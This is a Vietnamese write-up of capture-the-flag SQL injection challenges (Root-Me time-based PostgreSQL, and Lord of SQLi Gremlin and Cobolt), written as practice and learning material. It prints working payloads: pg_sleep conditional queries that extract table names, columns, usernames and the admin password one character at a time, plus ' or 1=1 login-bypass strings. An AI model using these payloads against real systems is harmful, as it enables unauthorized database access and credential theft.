# Challenge SQL Injection
## 1.Rootme:SQL injection - Time based
+   [Link challenge](http://challenge01.root-me.org/web-serveur/ch40/)
+   Ở đây đề bài là time-based nên mình thử inject một số trang:
![img](https://scontent.xx.fbcdn.net/v/t1.15752-9/329032973_3491653274396858_6283571348762962612_n.png?_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=wieAw4ChtbAAX9UsWaM&_nc_oc=AQn6HIN5BxM2LCpAmznCGP-rqAabZSj_Xk0CaO3z-li9cLk7Xb9VsX2ZfHsOzINxQhxOPxAYmblvAKZxxq8bsDm1&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTfBlETBpzedGQy5Si28ieZgiFidTfMM-f5PekpChKLiw&oe=640E4E89)
Thì mình phát hiện [http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;select%20pg_sleep(10)--%20-](http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;select%20pg_sleep(10)--%20-) bị delay có thể inject ở đây:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/330602682_749066446450740_5553230616976262669_n.png?stp=dst-png_p206x206&_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=ijunKOJG3s8AX8naGUu&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQRa9qz1s-RnmMl_WtEGU4npTuh-0kHj5IEH1GLB549eQ&oe=6411B647)

Ở đây cơ sở dữ liệu được sử dụng `PostgreSQL`
Mình cần tìm password của admin thì mình cần tìm ra xem nó thuộc bảng nào.
Bài này mình test hình như nó filter đi dấu '' nên mình phải dùng chr()
**PostgreSQL**
```PostgreSQL
;Select case when(1=1) then pg_sleep(10) else sleep(0) end-- -
;Select case when((select length(table_name) from information_schema.tables limit 1 offset $x$)>$y$) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> mình tìm length của các bảng

;Select case when((select substr(table_name,$y$,1) from information_schema.tables limit 1 offset $z$)=$chr(x)$) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> mình tìm tên của các bảng

;Select case when((select length(column_name) from information_schema.columns limit 1 offset $y$)=$x$) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> mình tìm length của các column trong bảng users

;Select case when((select length(column_name) from information_schema.columns limit 1 offset $y$)=$x$) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> Tìm tên các column trong bảng users

;Select case when((select length(username) from users limit 1 offset $y$)=$x$) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> Tìm tên các user trong bảng

;Select case when((select substr(username,$x$,1) from users limit 1 offset $y$)=chr($z$)) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> Tìm giá trị các username trong bảng users

;Select case when((select length(password) from users limit 1 offset $y$)=$x$) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> Tìm length password ứng với tài khoản admin

;Select case when((select substr(password,$x$,1) from users limit 1 offset $y$)=chr($z$)) 
then pg_sleep(10) else pg_sleep(0) end-- -
-- -> Tìm giá trị password ứng với tk admin
```

# 2.Gremlin
+ [Link challenge](https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331160072_498202262477895_4608847307808283276_n.png?stp=dst-png_p206x206&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=WVAqKrA6EksAX8LFNxG&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRXtLQ7ALDBfyDsq0Hl3FsCgr2U3X0_j1eWL-HSoFAfvw&oe=64131D9D)

Ở đây mình thấy nó không filter `'' or` nên mình thử để payload:
```Mysql
?id=1' or 1=1-- -
```
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/330670146_4509653449159040_8250095649946165562_n.png?stp=dst-png_p206x206&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=Wq_x5FAy4WQAX-NrIgp&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTQM_fNUT1YKHGc6m7O9Qxq6pglk3Hz74rJ5jAGEIP56w&oe=641311E1)
# 3.Cobolt
+ [Link Challenge](https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php)

![url](https://scontent.xx.fbcdn.net/v/t1.15752-9/331077910_1234167760786070_6490793722676036467_n.png?stp=dst-png_s480x480&_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=PysLZFzymGQAX9FnQQx&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSPqyslCQHNoYrRa7uA8pCvoaRHOXkTL8DuqqvhSYNOnA&oe=64132D8C)

Bài này mình thấy nó cũng không filter `'' or` nên mình thử payload:

![url](https://scontent.xx.fbcdn.net/v/t1.15752-9/330735631_592042309404956_5214444767209328104_n.png?stp=dst-png_s350x350&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=blVbUacuAVMAX8lF-uM&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTw-pbdhmcTrNU1ph_OAIZKcKF7guqjIribbKfm3iGf-w&oe=64130B76)

thì ở đây kết quả `result['id']` không phải là `admin` mà là `rubiya`,sau đó mình có sắp xếp mảng để get xem `id=admin` có ở đầu không:
```Mysql
?id=1' or 1=1 order by id asc-- -
```

![url](https://scontent.xx.fbcdn.net/v/t1.15752-9/331136246_484645440545750_7630334647886607610_n.png?stp=dst-png_p206x206&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=ajfEEvzc62wAX_RKls4&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQIjfwPuAt_vo8HtLaKBigvWI-6qHeGudXSQcIuU3URWg&oe=64130849)
